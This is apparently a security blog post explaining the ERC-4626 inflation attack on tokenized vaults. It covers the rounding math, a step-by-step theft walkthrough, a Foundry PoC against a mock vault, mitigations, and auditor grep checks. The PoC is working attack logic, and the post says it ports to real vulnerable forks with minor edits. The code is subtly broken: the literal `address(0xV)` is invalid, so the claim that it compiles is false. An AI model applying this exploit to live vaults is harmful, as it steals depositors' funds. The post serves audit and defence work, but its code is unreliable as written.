---
layout: post
title: "The ERC-4626 Inflation Attack: How First-Depositor Donations Wreck Vault Share Math"
date: 2026-05-31 06:33:18 +0000
---

# The ERC-4626 Inflation Attack: How First-Depositor Donations Wreck Vault Share Math

## A bug class that refuses to die

ERC-4626 standardized the tokenized-vault interface in 2022. The inflation attack against naive 4626 implementations was public the same year. Three audit cycles later it remains one of the most consistently rediscovered findings across Sherlock, Cantina, Code4rena, and Immunefi — not because the mitigation is hard, but because the standard's reference math is a footgun the moment a team copies it without OpenZeppelin's virtual-offset.

The pattern repeats. A team forks an old `ERC4626.sol`, swaps in a strategy, ships. The fork's `_convertToShares` does `assets * totalSupply / totalAssets`, with a `totalSupply == 0` branch that returns `assets` 1:1. Its `totalAssets()` returns `IERC20(asset).balanceOf(address(this))`. Both are faithful to the spec. Both are exploitable in the first block after deployment by whoever is watching the mempool for new vault deployments. The attacker spends one wei plus a donation they recover in full; the next honest depositor loses their entire deposit to integer rounding.

This post documents the mechanic from first principles, a self-contained Foundry PoC that compiles and steals, the three mitigations in production (OZ virtual offset, dead shares burned, internal accounting), their tradeoffs, and a grep-level checklist for auditors triaging a 4626 fork on a tight engagement clock.

## Mechanic from first principles

A 4626 vault tracks two scalars: `totalAssets` (underlying held) and `totalSupply` (shares issued). The price of one share, in underlying, is `totalAssets / totalSupply`. Conversions go both ways:

```
sharesOut = assetsIn * totalSupply / totalAssets   // deposit, mint
assetsOut = sharesIn * totalAssets / totalSupply   // redeem, withdraw
```

Both expressions are integer division, rounding **down**. The standard mandates rounding down on shares-out (so the vault never owes more shares than the user paid for) and rounding down on assets-out (so the vault never pays out more than the share fraction). Round either direction up and you leak value in the opposite direction.

The bootstrap branch is where the trouble lives. When `totalSupply == 0` a vault cannot compute a price — division by zero — so every reference implementation has a special case: the first depositor's shares equal their assets, 1:1. That branch is the attacker's foothold.

## The attack, step by step

Call the attacker A, the victim V, and the vault X. Underlying is a standard 18-decimal ERC-20.

1. **A waits for X to deploy.** Mempool scanners pick up `CREATE2` for known 4626 factory bytecode in under a block. The attack is most reliable on the first deposit; once a real depositor lands, the donation has to overcome real `totalSupply` and the economics change.
2. **A deposits 1 wei.** Bootstrap branch: `totalSupply == 0`, so A receives 1 share. State: `totalAssets = 1`, `totalSupply = 1`. Share price is `1 / 1 = 1`.
3. **A donates 10,000 × 10¹⁸ wei to X by transferring underlying directly to the vault address.** No `deposit()` call. The vault's `totalAssets()` reads `balanceOf(address(this))`, so the donation silently inflates the numerator. State after donation: `totalAssets = 10_000e18 + 1`, `totalSupply = 1`. Share price is now ≈ 10,000e18 underlying per share.
4. **V deposits 9,999 × 10¹⁸ wei.** The vault computes `sharesOut = 9_999e18 * 1 / (10_000e18 + 1) = 0`. V receives **zero shares** and the vault keeps the deposit. State: `totalAssets = 19_999e18 + 1`, `totalSupply = 1`.
5. **A redeems their 1 share.** The vault computes `assetsOut = 1 * (19_999e18 + 1) / 1 = 19_999e18 + 1`. A walks away with the full 19,999e18 — their original 10,000e18 donation plus V's 9,999e18 deposit.

V has no recourse on-chain. The vault's `redeem` reverts on `sharesIn = 0` for V, the deposit transaction emitted no useful events, and there is no slippage parameter in the bare 4626 `deposit(uint256 assets, address receiver)` signature to abort on a bad share quote.

## Foundry PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract MockERC20 {
    string public name = "Mock"; string public symbol = "MOCK"; uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a; balanceOf[to] += a; return true;
    }
    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a; return true;
    }
}

contract NaiveVault {
    MockERC20 public immutable asset;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    constructor(MockERC20 _a) { asset = _a; }
    function totalAssets() public view returns (uint256) { return asset.balanceOf(address(this)); }
    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = totalSupply == 0 ? assets : (assets * totalSupply) / totalAssets();
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares; balanceOf[receiver] += shares;
    }
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets) {
        assets = (shares * totalAssets()) / totalSupply;
        balanceOf[owner] -= shares; totalSupply -= shares;
        asset.transfer(receiver, assets);
    }
}

contract InflationAttackTest is Test {
    MockERC20 token; NaiveVault vault;
    address attacker = address(0xA); address victim = address(0xV);

    function setUp() public {
        token = new MockERC20(); vault = new NaiveVault(token);
        token.mint(attacker, 10_000 ether + 1);
        token.mint(victim,   9_999 ether);
    }

    function testInflationAttack() public {
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);                  // 1 wei -> 1 share
        token.transfer(address(vault), 10_000 ether); // donation, no deposit
        vm.stopPrank();

        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        uint256 shares = vault.deposit(9_999 ether, victim);
        assertEq(shares, 0, "victim gets zero shares");
        vm.stopPrank();

        vm.prank(attacker);
        uint256 out = vault.redeem(1, attacker, attacker);
        assertGt(out, 10_000 ether, "attacker withdraws victim's funds");
        emit log_named_uint("attacker walks with", out);
    }
}
```

Run with `forge test -vv`. The log line prints `attacker walks with: 19999000000000000000001`.

## Three mitigations and their tradeoffs

**(1) Virtual shares with decimal offset — OpenZeppelin's `ERC4626`, recommended.** Override `_decimalsOffset()` to return a constant `n > 0` (commonly 6). All conversions then operate on `totalSupply + 10**n` and `totalAssets + 1`. The virtual offset means the first depositor effectively shares the vault with a phantom 10ⁿ shares the attacker cannot redeem. To make V's quote round to zero, the attacker must donate roughly `victimDeposit × 10ⁿ` — the larger `n`, the more capital the attack costs, and at `n = 6` the donation usually exceeds the victim's deposit by six orders of magnitude. The attack is not eliminated; it is repriced into unprofitability. Tradeoff: the offset slightly dilutes real depositors' share count and complicates yield accounting at small TVL. Use `n = 6` unless you can justify otherwise.

**(2) Dead shares burned at first deposit — Uniswap V2's `MINIMUM_LIQUIDITY`.** On the very first deposit, mint a fixed amount (e.g. 1,000 shares) to `address(0)`. `totalSupply` is never again zero or one, so the bootstrap branch is dead and the donation has to overcome a real (if small) baseline. This is cheap to implement but provides less attack-cost padding than the virtual offset — an attacker who is the first real depositor can still cause measurable rounding loss to the second. Use as a complement to the offset, not a replacement.

**(3) Internal `_totalAssets` accounting — no `balanceOf` lookups.** Track assets in a state variable mutated only by `deposit`, `withdraw`, and explicit `accrue()` calls. Direct token transfers to the vault no longer move the price; the donation vector is closed at the source. Tradeoff: the vault no longer auto-recognises rebasing yield, airdrops of the underlying, or strategy harvests until the keeper calls a sync function — operationally heavier, and a missed sync silently misprices shares for honest depositors. Choose this when the asset is non-rebasing and the operator is reliable.

In production, combine (1) and (3) where possible. (1) prices the attack out of reach for the bootstrap window; (3) prevents donation-based price manipulation for the entire vault lifetime.

## Auditor checklist for a 4626 fork

Drop these greps on the target before the rest of the review. Each hit is a candidate finding.

```
# Is totalAssets() trusting balanceOf?
grep -rn "balanceOf(address(this))" --include="*.sol"

# Is the OZ virtual offset overridden?
grep -rn "_decimalsOffset" --include="*.sol"

# Is the bootstrap branch present and unguarded?
grep -rn "totalSupply\s*==\s*0" --include="*.sol"

# Does deposit() accept a minShares slippage parameter? (4626 standard does NOT — forks should add one)
grep -rn "function deposit" --include="*.sol" | grep -v "minShares\|minOut"

# First-deposit guard / dead-share mint?
grep -rn "MINIMUM_LIQUIDITY\|address(0)" --include="*.sol"
```

If `totalAssets()` reads `balanceOf` AND `_decimalsOffset` is absent AND `deposit` has no `minShares`, the fork is vulnerable. The PoC above will transplant onto it with cosmetic edits — change the constructor, point at the real asset, run.

The standard is fine. The reference implementation is fine. The forks are the problem, and they keep landing in scope.
